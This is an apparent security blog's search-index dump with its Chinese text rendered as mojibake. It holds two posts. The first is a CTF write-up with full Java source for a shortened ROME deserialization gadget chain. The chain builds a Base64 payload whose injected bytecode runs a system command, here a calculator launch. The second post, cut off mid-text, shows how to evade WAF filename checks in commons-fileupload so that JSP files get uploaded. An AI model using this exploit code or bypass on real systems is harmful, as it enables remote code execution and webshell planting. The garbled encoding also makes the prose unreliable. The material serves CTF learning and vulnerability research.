è®¡åˆ’æˆæœä»ysoserialåŸæœ¬çš„4000+ç¼©çŸ­åˆ°1320ï¼ˆBase64+å¼¹è®¡ç®—å™¨ï¼‰ å†™åœ¨å‰é¢â€‹ é¦–å…ˆéå¸¸æ„Ÿè°¢è¿™æ¬¡çš„D^3CTFç»™æˆ‘ä¸€æ¬¡å­¦ä¹ çš„æœºä¼šï¼Œä¸¤ä¸ªJavaé¢˜éƒ½æŒºæœ‰æ„æ€å­¦åˆ°äº†ä¸åŒçš„ä¸œè¥¿ï¼Œå› ä¸ºç¬¬äºŒä¸ªæ¯”è¾ƒç®€å•å°±ä¸åˆ†äº«äº†ï¼Œè¿™é‡Œåˆ†äº«ä¸€ä¸‹å¦‚ä½•å»ç¼©çŸ­ROMEåˆ©ç”¨é“¾ï¼Œæœ¬èº«æˆ‘ä¹Ÿæ˜¯ä¹‹å‰æ²¡å­¦ä¹ è¿‡ROMEï¼Œè¿™é‡Œä»¥ä¸€ä¸ªæ—è§‚è€…çš„è§†è§’æ¥è®²è¿°å¥½ç´¯ï¼Œå…¨ç¯‡æ²¡æœ‰å„ç§é«˜çº§æŠ€æœ¯ä¸æ¶‰åŠASMçš„æ”¹é€ ï¼Œä»…ä»…åªæ˜¯ä¸€äº›Trickå’Œåˆ©ç”¨é“¾çš„ç²¾ç®€ï¼ŒåŒæ—¶éå¸¸æ„Ÿè°¢æˆ‘çš„åŒå­¦@HolaAsä»¥åŠæˆ‘çš„æœ‹å‹@é£æ½‡åœ¨æˆ‘åšé¢˜è¿‡ç¨‹å½“ä¸­ç»™æˆ‘çš„å¸®åŠ© ç®€å•åˆ†æé¦–å…ˆçœ‹çœ‹è·¯ç”±ï¼Œå¾ˆç®€å•è¦æ±‚ä¼ å…¥å­—ç¬¦é•¿åº¦ä¸è¶…è¿‡1956 æ¥ä¸‹æ¥å…ä¸äº†æ‰¾ä¾èµ–åé¢å‘ç°äº†ROMEå¯ä»¥ç”¨ï¼Œåœ¨ysoserialé‡Œé¢ç›´æ¥é£Ÿç”¨ï¼Œå¯ä»¥æƒŠè®¶çš„çœ‹åˆ°è¿™é‡Œåªæœ‰çŸ­çŸ­çš„4400é‚£ä¹ˆâ€œçŸ­â€ï¼Œç—›ï¼å¤ªç—›äº†ï¼ å“å‘€æ€ä¹ˆåŠå‘¢ï¼Ÿæ—¢ç„¶è¦æ”¹é€ å…ä¸äº†éœ€è¦å…ˆçœ‹çœ‹è°ƒç”¨é“¾ 1234567891011121314151617/** * * TemplatesImpl.getOutputProperties() * NativeMethodAccessorImpl.invoke0(Method, Object, Object[]) * NativeMethodAccessorImpl.invoke(Object, Object[]) * DelegatingMethodAccessorImpl.invoke(Object, Object[]) * Method.invoke(Object, Object...) * ToStringBean.toString(String) * ToStringBean.toString() * ObjectBean.toString() * EqualsBean.beanHashCode() * ObjectBean.hashCode() * HashMap&lt;K,V&gt;.hash(Object) * HashMap&lt;K,V&gt;.readObject(ObjectInputStream) * * */ æ—¢ç„¶è¦æ”¹é€ æˆ‘çš„æ€è·¯æ˜¯ï¼Œå…ˆç²¾ç®€åˆ©ç”¨é“¾ï¼Œå†å‡å°‘ç»†èŠ‚ çœ‹åˆ°è¿™é‡Œæˆ‘èƒ½æœ‰ä¸ªæƒ³æ³•å°±æ˜¯ä»è°ƒç”¨readObjectåˆ°tostringéƒ½èƒ½å°è¯•ç±»æ›¿æ¢ï¼Œæœ€ä¸‹å±‚çš„ä¸ªäººæ„Ÿè§‰ä¼¼ä¹æ²¡å•¥å¿…è¦äº†ï¼Œé‚£ç›´æ¥å†å¾€ä¸Šå•°ï¼Ÿ ç®€å•äº†è§£å¾ˆæ˜æ˜¾ï¼Œæ—¢ç„¶è¦å°è¯•å»æ”¹é€ ä¸€æ¡é“¾å­ï¼Œé‚£ç¬¬ä¸€æ­¥å°±è¦å»æ·±å…¥äº†è§£ä»–ï¼ è¿™é‡Œå°±çœå»ä»‹ç»ObjectBeanã€ToStringBeanç­‰ç±»äº†ç™¾åº¦éƒ½æœ‰ï¼Œä¸åšæ¬è¿å·¥ å…ˆåšä¸ªç®€å•æ€»ç»“ HashMap-&gt;readObject è§¦å‘ ObjectBean-&gt;hashCode è§¦å‘ObjectBean å†…å°è£…çš„ ObjectBean -&gt; toString æ–¹æ³•ï¼Œä¹‹åå°±å¯ä»¥è§¦å‘åˆ©ç”¨é“¾ ä¹Ÿç®€å•çœ‹çœ‹å›¾å•° EqualsBeanè§¦å‘toString ç´§æ¥ç€com.sun.syndication.feed.impl.ToStringBean#toString(java.lang.String)ä¼šè°ƒç”¨æ‰€æœ‰ getter æ–¹æ³•ï¼Œå¤šæä¸€å˜´å…¶å®BeanIntrospector.getPropertyDescriptorsä¼šè·å–æ‰€æœ‰getter/setterï¼Œä½†æ˜¯ä¸‹é¢æœ‰å‚æ•°é•¿åº¦0é‚£æŒ‰ç…§æ­£å¸¸äººä»£ç å°±åªå‰©getteräº† å› æ­¤æœ€ç»ˆé€šè¿‡è§¦å‘getOutputPropertieså®ç°å­—èŠ‚ç åŠ è½½ é€šå¸¸ysoserialæ›´ç»†èŠ‚ï¼Œä¼šå¤šå¾ˆå¤šç»†èŠ‚ï¼Œå¯èƒ½ä¼šæ›´çŸ­ï¼Œä½†ä¸å½±å“ï¼Œè¿™é‡Œæˆ‘ä»¬ç®€å•æŒ‰ç…§é€»è¾‘å†™ä¸€ä¸‹ä»£ç ï¼ŒåŠ æ·±ç†è§£ æœç„¶ä¸å‡ºæˆ‘æ‰€æ–™æ›´é•¿äº†ï¼ ä½†è¿™é‡Œä¸»è¦æ˜¯å­¦ä¹ æ€è·¯ æ”¹é€ å¤±è´¥æ»´æ”¹é€ å°è¯•å¯ä»¥å¾ˆæ˜æ˜¾çš„çœ‹åˆ°åœ¨è¿™é‡Œæœ‰ä¸ªè§¦å‘toStringçš„è¿‡ç¨‹ï¼Œé‚£ä¹ˆå¾ˆå®¹æ˜“å°±èƒ½æƒ³åˆ°ä¹‹å‰é€šè¿‡BadAttributeValueExpExceptionå»è§¦å‘toStringè¿™ä»¶äº‹ï¼Œæ„é€ å®Œåçœ‹çœ‹ï¼Œå“¦å¯„äº†ï¼å±äºæ˜¯å¸®å€’å¿™ç¬¬ä¸€åäº†ï¼Œæ‹œæ‹œå†è§ä¸è”ç³»äº†å˜ï¼ æˆåŠŸæ»´æ”¹é€ å°è¯•Step1â€“æ”¹é€ åˆ©ç”¨é“¾åœ¨ä¹‹å‰çš„è¿‡ç¨‹å½“ä¸­æœ‰ä¸ªåœ°æ–¹éå¸¸å¸å¼•æˆ‘ï¼Œcom.sun.syndication.feed.impl.EqualsBean#equalsæ–¹æ³• å¯ä»¥çœ‹åˆ°equalsæœ€ç»ˆè°ƒç”¨beanEqualsè¿™ä¸å°±å’Œcom.sun.syndication.feed.impl.ToStringBean#toStringå¾ˆåƒä¹ˆï¼Œä½†æ˜¯å¦‚ä½•èƒ½è§¦å‘equalsæ–¹æ³•å‘¢ å€Ÿç”¨pç‰›çš„ä¸€å¥è¯ï¼Œä½†æ˜¯jdk7u21çš„åœºæ™¯ä¸é€‚åˆæˆ‘ä»¬è¿™é‡Œï¼ŒåŸå› è¯·çœ‹pç‰›çŸ¥è¯†æ˜Ÿçƒï¼ˆæ‰“æ³¢å¹¿å‘Špç‰›çœ‹åˆ°è¯·ç»™é’±ï¼‰ è°ƒç”¨equalsçš„åœºæ™¯å°±æ˜¯é›†åˆsetã€‚setä¸­å‚¨å­˜çš„å¯¹è±¡ä¸å…è®¸é‡å¤ï¼Œæ‰€ä»¥åœ¨æ·»åŠ å¯¹è±¡çš„æ—¶å€™ï¼ŒåŠ¿å¿…ä¼šæ¶‰åŠåˆ°æ¯”è¾ƒæ“ä½œ ä½†æ˜¯è¿™ä¸ªå¾ˆæ˜æ˜¾å¹¶ä¸é€‚åˆæˆ‘ä»¬è¿™ä¸ªåœºæ™¯ï¼ˆä¸¤ä¸ªç›¸åŒå¯¹è±¡hashCodeéƒ½ä¸€æ ·äº†å°±ä¸å¯èƒ½æˆåŠŸäº†ï¼Œä¸å¤šè¯´è‡ªå·±æƒ³ï¼‰ é‚£è¿˜æœ‰å•¥åˆ©ç”¨ä¹ˆï¼Œå½“ç„¶æœ‰çš„ï¼Œæ¯”å¦‚HashMapå¯¹keyä¹Ÿæœ‰è¿™ä¸ªç¥å¥‡çš„æœºåˆ¶ï¼Œ ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œæˆ‘ä»¬æŠ½ä¸å‰¥èŒ§æ…¢æ…¢æ¥å•°ï¼Œä¸‹é¢çš„åªæ˜¯å¯¹åé¢åšé“ºå« å…ˆæ¥ä¸ªç®€å•çš„åœºæ™¯ï¼Œé¦–å…ˆçœ‹ä¸‹é¢è¿™ä¸ªä»£ç  123456HashMap&lt;Object, Object&gt; objectObjectHashMap = new HashMap&lt;&gt;();HashMap&lt;Object, Object&gt; objectObjectHashMap1 = new HashMap&lt;&gt;();objectObjectHashMap.put(&quot;aa&quot;,&quot;&quot;);objectObjectHashMap1.put(&quot;bB&quot;,&quot;&quot;);System.out.println(objectObjectHashMap.hashCode());System.out.println(objectObjectHashMap1.hashCode()); ä¼šè§‰å¾—ä»–ä»¬ç›¸åŒå—ï¼Œç­”æ¡ˆå¾ˆæ˜¾ç„¶ ä¸ºä»€ä¹ˆå‘¢ï¼Œå¯ä»¥çœ‹åˆ°ï¼Œç”±äºæˆ‘ä»¬valueä¸ºç©ºå…¶å®å°±æ˜¯æ¯”è¾ƒkeyçš„hashCodeäº† 123public final int hashCode() &#123; return Objects.hashCode(key) ^ Objects.hashCode(value);&#125; å¯¹äºä¸€ä¸ªStringç±»å‹å…¶hashCodeï¼Œè€ƒè™‘ä¸¤ä¸ªå…ƒç´ çš„åœºæ™¯ä¹Ÿå°±æ˜¯31*val[0]+val[1]=31val[0]+val[1]ï¼Œå› æ­¤ç¬¬ä¸€ä¸ªå…ƒç´ å¦‚æœæ¯”ç¬¬äºŒä¸ªå…ƒç´ å°1ï¼Œç¬¬äºŒä¸ªå…ƒç´ å°±å¿…é¡»æ¯”ç¬¬ä¸€ä¸ªå…ƒç´ å¤§31 ç°åœ¨åœºæ™¯æå‡ 1234objectObjectHashMap.put(&quot;aa&quot;,&quot;1&quot;);objectObjectHashMap.put(&quot;bB&quot;,&quot;2&quot;);objectObjectHashMap1.put(&quot;aa&quot;,&quot;2&quot;);objectObjectHashMap1.put(&quot;bB&quot;,&quot;1&quot;); ä»ç„¶ç›¸ç­‰ï¼Œå¯¹äºè¿™ä¸ªåœºæ™¯é‡Œé¢æœ‰ä¸¤ä¸ªå…ƒç´ ï¼Œå®ƒä¼šè°ƒç”¨çˆ¶ç±»çš„java.util.AbstractMap#hashCode 1234567public int hashCode() &#123; int h = 0; Iterator&lt;Entry&lt;K,V&gt;&gt; i = entrySet().iterator(); while (i.hasNext()) h += i.next().hashCode(); return h;&#125; ä¸ºäº†ç®€åŒ–ç†è§£å¯ä»¥æŠŠä¸Šé¢çš„åœºæ™¯ä»£ç ç®€åŒ–ä¸º(æ¯•ç«Ÿaaä¸bBç›¸ç­‰)ï¼Œè¿™æ ·çœ‹æ˜¯ä¸æ˜¯å°±å¾ˆå¥½ç†è§£äº† 1234objectObjectHashMap.put(&quot;aa&quot;,&quot;1&quot;);objectObjectHashMap.put(&quot;aa&quot;,&quot;2&quot;);objectObjectHashMap1.put(&quot;aa&quot;,&quot;2&quot;);objectObjectHashMap1.put(&quot;aa&quot;,&quot;1&quot;); æœ‰äº†è¿™ä¸ªåŸºç¡€ï¼Œå†æ¬¡å›åˆ°æˆ‘ä»¬æ„é€ ROMEçš„è¿‡ç¨‹å½“ä¸­ ç°åœ¨æˆ‘ä»¬å·²ç»çŸ¥é“äº†java.util.HashMap#putValåœ¨keyçš„hashCodeä¸€è‡´çš„æ—¶å€™ä¼šè§¦å‘equalsæ–¹æ³•è°ƒç”¨ï¼Œä½†æ˜¯æ­¤åˆ»æˆ‘ä»¬çš„ä»£ç çš„keyæ˜¯Stringç±»å‹è°ƒç”¨äº†ä¹Ÿæ²¡ç”¨å•Šï¼Œè¿™é‡Œå¾ˆå·§çš„æ˜¯åœ¨HashMapçš„equalsæ–¹æ³•å½“ä¸­,å½“å¯¹è±¡å¤§äº1æ—¶ä¼šè½¬è€Œè°ƒç”¨çˆ¶ç±»java.util.AbstractMap#equals,å¯ä»¥å¾ˆæ˜æ˜¾çœ‹åˆ°è¿™é‡Œè°ƒç”¨äº†value.equalsï¼ŒåŒæ—¶è¿™é‡Œæˆ‘ä»¬éœ€è¦å°†equalsçš„ä¼ å‚æ•°æ”¹ä¸ºTemplatesImplå¯¹è±¡ é‚£å¦‚ä½•æå®šå‘¢ï¼Œé‚£å°±æ˜¯æŠŠä¸¤ä¸ªmapçš„valueé¢ å€’ä¸€ä¸‹å…·ä½“ä¸ºä»€ä¹ˆè‡ªå·±æƒ³æƒ³å¾ˆç®€å•(â€œaaâ€=&gt;bean.quals(â€œaaâ€=&gt;templates))è¿™é‡Œ=&gt;è¡¨ç¤ºå¯¹åº” 1234map1.put(&quot;aa&quot;,templates);map1.put(&quot;bB&quot;,bean);map2.put(&quot;aa&quot;,bean);map2.put(&quot;bB&quot;,templates); å› æ­¤å®‰è¿™ä¸ªæ€è·¯æˆ‘ä»¬å¯ä»¥å¾—åˆ° ç—›ï¼å¤ªç—›äº†ï¼ä¸è¿‡è¿˜æ˜¯ç¼©äº†ä¸€åƒå¤šäº†ï¼Ÿ ä»”ç»†ä¸€æƒ³ç½ªé­ç¥¸é¦–å°±æ˜¯ Gadgets.createTemplatesImpl(command); Step2â€“è¶…çº§å°Trické‚£æˆ‘ä»¬æ¥çœ‹çœ‹è¿™ä¸ªysoserialç”Ÿæˆçš„ç±»æ˜¯å•¥æ ·å­ è¿™é‡Œå¾ˆå¤šä¸œè¥¿æˆ‘ä»¬éƒ½å¯ä»¥æ”¹ï¼Œå•¥serialVersionUIDã€Pwner311912468728708ã€ç­‰ç­‰è¿™äº›éƒ½å¯ä»¥æ‹¿ä¸‹ ä½†æ˜¯ä½ ä»¥ä¸ºè¿™æ ·å°±okäº†ï¼Œç»™å¤§å®¶çœ‹ä¸ªéªšçš„ æ²¡æœ‰trycatchï¼Œæ²¡æœ‰å®ç°æŠ½è±¡ç±»çš„æ–¹æ³•ï¼Œè¿™æ€ä¹ˆå®ç°çš„ï¼ï¼ï¼ æˆ‘ä»¬å¹³æ—¶javacç¼–è¯‘çš„æ—¶å€™ï¼ŒåŒæ ·çš„ä»£ç éƒ½ä¼šæŠ¥é”™ é‚£ä¸Šé¢è¿™ä¸ªå’‹æçš„å˜ï¼Œè€Œä¸”ä¸æŠ¥é”™ï¼Œé‚£å°±æ˜¯javassistå•°ï¼Œä¸ç”¨ASMå»æ“ä½œå¥½æäº† ç°åœ¨å†çœ‹çœ‹é•¿åº¦å˜ï¼Œ1324å°è‰è“åç¬‘ æµ‹è¯•ä¸‹å˜okè®¡ç®—å™¨æ¥äº†ï¼Œè®°å¾—urlç¼–ç ä¸€ä¸‹å“¦ï¼ æœ€ç»ˆä»£ç Rome.java 123456789101112131415161718192021222324252627282930313233343536373839import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import com.sun.syndication.feed.impl.EqualsBean;import javax.xml.transform.Templates;import java.io.ByteArrayOutputStream;import java.io.ObjectOutputStream;import java.util.Base64;import java.util.HashMap;import static sec.payload.Payload.setFieldValue;public class Rome &#123; public static void main(String[] args) throws Exception &#123; TemplatesImpl templates = GetTemplatesImpl.getTemplatesImpl(); EqualsBean bean = new EqualsBean(String.class,&quot;&quot;); HashMap map1 = new HashMap(); HashMap map2 = new HashMap(); map1.put(&quot;aa&quot;,templates); map1.put(&quot;bB&quot;,bean); map2.put(&quot;aa&quot;,bean); map2.put(&quot;bB&quot;,templates); HashMap map = new HashMap(); map.put(map1,&quot;&quot;); map.put(map2,&quot;&quot;); setFieldValue(bean,&quot;_beanClass&quot;,Templates.class); setFieldValue(bean,&quot;_obj&quot;,templates); ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(); ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream); objectOutputStream.writeObject(map); System.out.println(new String(Base64.getEncoder().encode(byteArrayOutputStream.toByteArray()))); System.out.println(new String(Base64.getEncoder().encode(byteArrayOutputStream.toByteArray())).length()); &#125;&#125; GetTemplatesImpl.java 12345678910111213141516171819202122232425import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import java.lang.reflect.Field;public class GetTemplatesImpl &#123; public static TemplatesImpl getTemplatesImpl() throws Exception&#123; byte[][] bytes = new byte[][]&#123;GenerateEvilByJavaassist.generate()&#125;; TemplatesImpl templates = TemplatesImpl.class.newInstance(); setValue(templates, &quot;_bytecodes&quot;, bytes); setValue(templates, &quot;_name&quot;, &quot;1&quot;); setValue(templates, &quot;_tfactory&quot;, null); return templates; &#125; public static void setValue(Object obj, String name, Object value) throws Exception&#123; Field field = obj.getClass().getDeclaredField(name); field.setAccessible(true); field.set(obj, value); &#125;&#125; GenerateEvilByJavaassist.java 12345678910111213141516171819import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import javassist.ClassPool;import javassist.CtClass;import javassist.CtConstructor;public class GenerateEvilByJavaassist &#123; public static byte[] generate() throws Exception&#123; ClassPool pool = ClassPool.getDefault(); CtClass clazz = pool.makeClass(&quot;a&quot;); CtClass superClass = pool.get(AbstractTranslet.class.getName()); clazz.setSuperclass(superClass); CtConstructor constructor = new CtConstructor(new CtClass[]&#123;&#125;, clazz); constructor.setBody(&quot;Runtime.getRuntime().exec(\\&quot;open -na Calculator\\&quot;);&quot;); clazz.addConstructor(constructor); return clazz.toBytecode(); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/tags/Java/"},{"name":"ååºåˆ—åŒ–","slug":"ååºåˆ—åŒ–","permalink":"https://y4tacker.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"}]},{"title":"Javaæ–‡ä»¶ä¸Šä¼ å¤§æ€å™¨-ç»•waf(é’ˆå¯¹commons-fileuploadç»„ä»¶)","slug":"year/2022/2/Javaæ–‡ä»¶ä¸Šä¼ å¤§æ€å™¨-ç»•waf(é’ˆå¯¹commons-fileuploadç»„ä»¶)","date":"2022-02-25T02:06:55.000Z","updated":"2024-08-04T09:01:49.093Z","comments":true,"path":"2022/02/25/year/2022/2/Javaæ–‡ä»¶ä¸Šä¼ å¤§æ€å™¨-ç»•waf(é’ˆå¯¹commons-fileuploadç»„ä»¶)/","link":"","permalink":"https://y4tacker.github.io/2022/02/25/year/2022/2/Java%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%A4%A7%E6%9D%80%E5%99%A8-%E7%BB%95waf(%E9%92%88%E5%AF%B9commons-fileupload%E7%BB%84%E4%BB%B6)/","excerpt":"","text":"Javaæ–‡ä»¶ä¸Šä¼ å¤§æ€å™¨-ç»•waf(é’ˆå¯¹commons-fileuploadç»„ä»¶)PSï¼šé«˜ç‰ˆæœ¬æ‰æœ‰1.3ä»¥ä¸Š æ¥ä¸ªä¸­äºŒçš„æ ‡é¢˜ï¼Œå“ˆå“ˆå“ˆï¼Œçµæ„Ÿæ¥æºäºæ˜¨æ™šèµ›åšç¾¤æœ‰ä¸ªå¸ˆå‚…@æˆ‘æ˜¯killerå‘äº†ç¯‡æ–°æ–‡ç« ï¼Œåœ¨é‚£ç¯‡æ–‡ç« å½“ä¸­æåˆ°äº†åœ¨filename=&quot;1.jsp&quot;çš„filenameå­—ç¬¦å·¦å³å¯ä»¥åŠ ä¸Šä¸€äº›ç©ºç™½å­—ç¬¦%20 %09 %0a %0b %0c %0d %1c %1d %1e %1fï¼Œæ¯”å¦‚%20filename%0a=&quot;1.jsp&quot;(ç›´æ¥ç”¨urlç¼–ç ä¸ºäº†åŒºåˆ«)è¿™æ ·å¯¼è‡´wafåŒ¹é…ä¸åˆ°æˆ‘ä»¬ä¸Šä¼ â½‚ä»¶ åï¼Œâ½½æˆ‘ä»¬ä¸Šä¼ ä¾ç„¶å¯ä»¥è§£æï¼Œæˆ‘å¯¹æ¬¡è¿›è¡Œäº†æ›´æ·±å…¥çš„ç ”ç©¶ï¼Œä¹Ÿæ˜¯å¯¹å¸ˆå‚…æ–‡ç« å¯¹ä¸€æ¬¡è¡¥å……ï¼Œä¸‹é¢ä¸ºäº†è¡”æ¥è¿˜æ˜¯å…ˆæ¢³ç†ä¸€éï¼Œçœ‹è¿‡èµ›åšç¾¤çš„å¸ˆå‚…å¯ä»¥å…ˆè·³è¿‡å‰é¢çš„éƒ¨åˆ†ï¼Œç›´æ¥çœ‹æœ€åä¸€éƒ¨åˆ†(æ¯•ç«Ÿæˆ‘æƒ³å‘ä¸ªåšå®¢) ä¸Šä¼ ä»£ç é’ˆå¯¹ä½¿â½¤commons-fileuploadå¤„ç†â½‚ä»¶ä¸Šä¼  12345678910111213141516public class TestServlet extends HttpServlet &#123; public void doPost(HttpServletRequest request, HttpServletResponse response) throws IOException &#123; String path = &quot;/Users/y4tacker/Desktop/JavaStudy/testtest&quot;; try &#123; ServletFileUpload servletFileUpload = new ServletFileUpload(new DiskFileItemFactory()); servletFileUpload.setHeaderEncoding(&quot;UTF-8&quot;); List&lt;FileItem&gt; fileItems = servletFileUpload.parseRequest(request); for (FileItem fileItem : fileItems) &#123; response.getWriter().write(fileItem.getName()); fileItem.write(new File(path+&quot;/&quot;+fileItem.getName())); &#125; &#125;catch (Exception e)&#123; &#125; &#125;&#125; å‰ç½®åˆ†æå°†æ–­ç‚¹æ‰“åœ¨servletFileUpload.parseRequest(request),è·Ÿå…¥getItemIterator ä¸€ç›´å¾€ä¸‹åˆ°org.apache.commons.fileupload.FileUploadBase.FileItemIteratorImpl#FileItemIteratorImpl Content-Type è¦å¼€å¤´ä¸º multipart/ æ¥ä¸‹æ¥å¯¹æµçš„å¤„ç†éƒ¨åˆ†å¿½ç•¥ï¼Œåˆ°ä¸‹é¢æœ‰ä¸ªthis.boundary = FileUploadBase.this.getBoundary(contentType);,å› ä¸ºæ–‡ä»¶ä¸Šä¼ çš„æ ¼å¼å°±æ˜¯,å¯ä»¥çŒœå‡ºè¿™é‡Œå°±æ˜¯è§£æè¿™ä¸€éƒ¨åˆ† 12345------WebKitFormBoundaryTyBDoKvamN58lcEwContent-Disposition: form-data; name=&quot;filename&quot;; filename=&quot;1.jsp&quot;233------WebKitFormBoundaryTyBDoKvamN58lcEw-- å½“æ—¶å¸ˆå‚…è·³è¿‡ä¸­é—´ä¸€äº›éƒ¨åˆ†åˆ°äº†org.apache.commons.fileupload.FileUploadBase#getFileName(java.lang.String) åœ¨parser.parse(pContentDisposition, &#39;;&#39;);ï¼Œç®€å•è¯´ä¸‹ä½œç”¨æ˜¯å…ˆâ½¤åˆ†å·å°† form-data; name=&quot;file&quot;; filename=&quot;1.jsp&quot; åˆ†å‰²ç„¶åè·å– ç­‰äºå·å‰â¾¯çš„å€¼ï¼Œè¿™é‡Œæˆ‘ä»¬çœ‹çœ‹åˆ°getTokenå½“ä¸­çš„æ ˆï¼ˆæ–¹ä¾¿å¤§å®¶è°ƒè¯•ï¼‰ 12345678getToken:99, ParameterParser (org.apache.commons.fileupload)parseToken:162, ParameterParser (org.apache.commons.fileupload)parse:311, ParameterParser (org.apache.commons.fileupload)parse:279, ParameterParser (org.apache.commons.fileupload)parse:262, ParameterParser (org.apache.commons.fileupload)parse:246, ParameterParser (org.apache.commons.fileupload)getBoundary:423, FileUploadBase (org.apache.commons.fileupload)&lt;init&gt;:988, FileUploadBase$FileItemIteratorImpl è¿™é‡Œæœ‰ä¸ªåˆ° Character.isWhitespaceï¼Œä¹Ÿå°±æ˜¯@æˆ‘æ˜¯killerå¸ˆå‚…æåˆ°çš„ç‚¹ï¼Œä¹Ÿæ˜¯æˆ‘ä»¬å¼€ç¯‡å‰è¨€ä¸­è¯´åˆ°çš„åˆ©ç”¨æ–¹å¼ï¼Œå°±ä¸å¤šæäº† æ­£æ–‡å¼€å¯çœ‹çœ‹getFileNameè°ƒç”¨å‰ï¼Œå…¶å®ä¼ å…¥äº†ä¸€ä¸ªheadersï¼Œè¿™ä¸ªheadersæ¥æºäºä¸Šé¢çš„this.multi è€Œè¿™ä¸ªmultiæ¥æºï¼Œè¿˜ä¸æˆ‘ä»¬ä¸Šé¢çš„bundaryæœ‰å…³ ç»§ç»­å›åˆ°ä¸Šé¢çš„getFileNameä¹‹å‰this.boundary = FileUploadBase.this.getBoundary(contentType); å¤±è´¥çš„ç»•wafç‚¹ä»è¿™é‡Œå¯ä»¥çœ‹åˆ°å’Œä¸Šé¢getFileNameçš„åˆ†éš”ç¬¦ä¸ä¸€æ ·ï¼Œè¿™é‡Œç”¨äº†ä¸¤ä¸ªåˆ†éš”ç¬¦ï¼Œé‚£ä¹ˆè¿™é‡Œæˆ‘å°±åœ¨æƒ³å¦‚æœgetFileNameé‚£é‡Œå¦‚æœå’Œè¿™ä¸ªé€»è¾‘ä¸ç›¸å…³å²‚ä¸æ˜¯å¯ä»¥æ‹¿ä¸‹ æˆ‘ä»¬çŸ¥é“ä¸Šé¢getFileNameçš„å‚æ•°æ¥æºäºorg.apache.commons.fileupload.MultipartStream#readHeadersï¼Œå¯ä»¥çœ‹åˆ°è¿™é‡Œæ˜¯é€šè¿‡forå¾ªç¯éå†å¹¶è°ƒç”¨getBytesè·å– è€Œè¿™ä¸ªinputæ¥æºå°±æ˜¯æˆ‘ä»¬ä¹‹å‰ä¼ å…¥çš„è¾“å…¥æµ å› æ­¤è¿™é‡Œçš„ç»•è¿‡æ€è·¯ä¾¿æ˜¯æ— æ³•å¥æ•ˆï¼Œä¸»è¦åŸå› æ˜¯ï¼Œçœ‹getFilenameè¿™é‡Œï¼Œåˆ†å‰²ç¬¦åªæœ‰;ï¼Œæˆ‘ä¹Ÿæ˜¯éº»äº† æˆåŠŸçš„ç»•wafç‚¹åœ¨org.apache.commons.fileupload.ParameterParser#parse(char[], int, int, char)ï¼Œ wowï¼ï¼ï¼Œè¿™é‡Œå¯¹valueè¿›è¡Œäº†MimeUtility.decodeTextæ“ä½œ æˆ‘ä»¬çŸ¥é“å¯¹MIMEçš„ç¼–ç å‡ºç°åœ¨é‚®ä»¶ä¸­ï¼Œå› ä¸º SMTP åè®®ä¸€å¼€å§‹åªæ”¯æŒçº¯ ASCII æ–‡æœ¬çš„ä¼ è¾“ï¼Œè¿™ç§æƒ…å†µä¸‹ï¼ŒäºŒè¿›åˆ¶æ•°æ®è¦é€šè¿‡ MIME ç¼–ç æ‰èƒ½å‘é€ é‚£æˆ‘ä»¬æ¥çœ‹çœ‹è¿™ä¸ªdecodeé‡Œé¢å¹²äº†å•¥,æˆ‘ç›´æ¥çœ‹äº†ä¸‹é¢å¦‚æœ=?å¼€å¤´åˆ™ä¼šè°ƒç”¨decodeæ–¹æ³• æˆ‘æ¥å¯¹è¿™ä¸²åˆè‡­åˆé•¿çš„ä»£ç è¿›è¡Œè§£è¯»ï¼Œä¸»è¦æ˜¯ä¸ºäº†ç¬¦åˆRFC 2047è§„èŒƒ è¦æ±‚ä»¥=?å¼€å¤´ ä¹‹åè¦æ±‚è¿˜è¦æœ‰ä¸€ä¸ª?ï¼Œä¸­é—´çš„å†…å®¹ä¸ºç¼–ç ï¼Œä¹Ÿå°±æ˜¯=?charset? è·å–ä¸‹ä¸€ä¸ª?é—´çš„å†…å®¹ï¼Œè¿™é‡Œä¸ä¸‹é¢çš„ç¼–è§£ç æœ‰å…³ ä¹‹åå®šä½åˆ°æœ€åä¸€ä¸ª?=é—´å†…å®¹æ‰§è¡Œè§£ç  è¿™é‡Œæˆ‘ä»¬æ¥ä¸€ä¸ªå®ä¾‹æ–¹ä¾¿ç†è§£ä¸Šé¢æ­¥éª¤=?gbk?Q?=31=2e=6a=73=70?= ä»ä¸Šé¢çš„æ­¥éª¤å¯ä»¥çœ‹åˆ°å¯¹æŒ‡æ”¯æŒä¸¤ç§è§£ç ä¸€ç§æ˜¯Bä¸€ç§Qï¼Œåˆ†åˆ«å¯¹åº”Base64ä»¥åŠQuoted-printableç¼–ç ï¼Œå¯¹äºå‰è€…å¤§å®¶éƒ½å¾ˆç†Ÿæ‚‰ï¼Œå¯¹äºåè€…æˆ‘ä»¬è¿™é‡Œåªè¯´å¦‚ä½•ç¼–ç  Quoted-printableå°†ä»»ä½•8-bitå­—èŠ‚å€¼å¯ç¼–ç ä¸º3ä¸ªå­—ç¬¦ï¼šä¸€ä¸ªç­‰å·â€=â€åè·Ÿéšä¸¤ä¸ªåå…­è¿›åˆ¶æ•°å­—(0â€“9æˆ–Aâ€“F)è¡¨ç¤ºè¯¥å­—èŠ‚çš„æ•°å€¼ã€‚ä¾‹å¦‚ï¼ŒASCIIç æ¢é¡µç¬¦ï¼ˆåè¿›åˆ¶å€¼ä¸º12ï¼‰å¯ä»¥è¡¨ç¤ºä¸ºâ€=0Câ€ï¼Œ ç­‰å·â€=â€ï¼ˆåè¿›åˆ¶å€¼ä¸º61ï¼‰å¿…é¡»è¡¨ç¤ºä¸ºâ€=3Dâ€ï¼Œgb2312ä¸‹â€œä¸­â€è¡¨ç¤ºä¸º=D6=D0 å› æ­¤æˆ‘ä»¬å°±å¯ä»¥å¯¹è¿™ä¸ªvalueè¿›è¡Œä¸€äº›ç¼–ç çš„éªšæ“ä½œï¼Œä¸‹é¢æˆ‘ä»¬æ¥æ¢³ç†ä¸‹å¯åˆ©ç”¨çš„ç‚¹ 